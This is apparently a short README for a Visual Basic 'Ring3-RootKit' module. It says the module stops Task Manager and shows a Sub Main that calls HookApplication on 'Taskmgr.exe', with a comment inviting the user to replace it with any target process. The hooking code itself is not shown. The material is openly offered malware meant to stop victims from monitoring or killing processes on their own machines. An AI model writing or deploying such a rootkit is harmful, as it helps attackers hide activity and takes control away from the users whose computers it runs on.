# Ring3-RootKit
This is a VB module

This rootkit Stops Task Manager.

To change the process to stop edit:

Sub Main()

  Console.Title = "Proccess Killer"

  HookApplication("Taskmgr.exe") 'Change "Taskmgr.exe" to desired process name

  Console.ReadLine()

End Sub
